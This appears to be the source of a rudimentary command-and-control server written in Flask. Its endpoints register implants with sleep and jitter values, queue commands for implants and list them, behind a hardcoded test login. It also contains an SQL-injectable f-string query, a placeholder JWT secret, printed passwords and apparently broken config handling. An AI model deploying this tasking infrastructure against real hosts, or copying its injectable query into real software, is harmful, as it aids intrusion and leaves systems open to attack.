# The C2 Server

import os
from datetime import datetime

import config
import tools
from decouple import config
from flask import (Flask, jsonify, make_response, redirect, render_template,
                   request, url_for)
from flask_cors import CORS, cross_origin
from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                get_jwt_identity, jwt_required,
                                unset_jwt_cookies)
from psycopg2 import connect, sql

app = Flask(__name__)
CORS(app)

config.host = config('host')
config.password = config('password')
config.username = config('username')
config.port = config('thePort')
config.database = config('database')
config.clientURL = config('client')

# Code taken from https://dev.to/nagatodev/how-to-add-login-authentication-to-a-flask-and-react-application-23i7
app.config["JWT_SECRET_KEY"] = "change-me"
app.config['CORS_HEADERS'] = 'Content-Type'
jwt = JWTManager(app)

@app.route('/logout', methods=["POST"])
def logout():
    try:
        response = jsonify({"msg": "logout success"})
        unset_jwt_cookies(response)
        return response
    except:
        return "couldn't logout...", 500, {'Access-Control-Allow-Origin': config.clientURL}


@app.route('/login', methods=["POST"])
def create_token():
    access_token = ""
    try:
        data = request.form
        username = data["username"]
        password = data["password"]
        print(username)
        print(password)
        if username != "test" or password != "test":  # hardcoded login, TODO compare to database
            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': config.clientURL}

        access_token = create_access_token(identity=username)
        print(f"success logging in: {access_token}")
        return ({'access_token': access_token}, 200, {'Access-Control-Allow-Origin': config.clientURL})
    except Exception as error:
        print(f"error logging in: {error}")
        return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/test", methods=["GET"])
def handle_test():
    stuff = tools.executeInsertQuery("SELECT * from command_queue")
    return jsonify(stuff)


@app.route("/")
def home():
    return "<div>Hi</div>", 200


# api endpoint to queue a command
@app.route("/queueCommand", methods=["POST"])
def handle_execute():
    try:
        target_implant_id = int(request.form.get('target_implant_id'))
        command = request.form.get('command')
        created_on = datetime.now().isoformat()
        status = "untouched"

        columns = ['target_implant_id', 'command', 'created_on', 'status']

        data = target_implant_id, command, created_on, status

        query = config.insertQueryBuilder("task_queue", columns)
        print(f"data: {data}")
        failure = tools.executeInsertQuery(query, data)
        if (failure != None):
            print(failure)
            return "Failure executing query", 400, {'Access-Control-Allow-Origin': config.clientURL}

        response = app.response_class(
            response="Success!",
            status=200,
            mimetype="application/json"
        )
        response.headers['Access-Control-Allow-Origin'] = config.clientURL
        return response
    except Exception as error:
        print(f"Failure sending commands: {error}")
        response = app.response_class(
            response=f"Failure! {error}",
            status=400,
            mimetype="application/json"
        )
        response.headers['Acess-Control-Allow-Origin'] = config.clientURL
        return response

# List all commands for a particular implant


@app.route("/getCommands/<id>", methods=["POST"])
def get_commands(id):
    success = None
    try:
        data = tools.executeSelectQuery(
            f"SELECT command FROM task_queue WHERE implant_id={id}")
        return data, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data")
        print(error)
        return f"Failure {error}", 401, {'Access-Control-Allow-Origin': config.clientURL} 

# Register an implant, on the implant side
@app.route("/register_implant", methods=["POST"])
def register_implant():
    try:
        print("Registering Implant")
        data = request.json
        print(f"Recieved: {data}")
        print(data['sleep'])
        jitter = data['jitter']
        sleep = data['sleep']
        first_connection = last_seen = datetime.now().isoformat()
        active = True
        columns = ["first_connection", "active", "jitter", "sleep", "last_seen"]
        values = [first_connection, active, jitter, sleep, last_seen]
        print("Executing Query")
        query = tools.insertQueryBuilder("implants", columns, ["implant_id"])
        response = tools.executeInsertQuery(query, values)
        print(f"Response: {response}")
        return response, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as e:
        print(f"ERROR: {e}")
        return e, {'Access-Control-Allow-Origin': config.clientURL}

#Display implants 
@app.route("/display_implants", methods=["GET"])
def display_implants():
    try:
        dbResp = tools.executeSelectQuery("SELECT * FROM IMPLANTS")
        print(dbResp)
        return dbResp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as e:
        print(f"Error displaying implants: {e}")
        return f"Error displaying results: {e}", 401, {'Access-Control-Allow-Origin': config.clientURL}

# for testing
# def main():
#     target_implant_id = 1
#     command = 'some long command'
#     created_on = '2022-12-01T16:41:10.592868'
#     status = 'untouched'
#     data = [target_implant_id, command, created_on, status]
#     columns = ['target_implant_id', 'command', 'created_on', 'status']

#     query = insertQueryBuilder('task_queue', columns)
#     results = executeInsertQuery(query, data)

#     print(results)


# if __name__ == "__main__":
#     main()
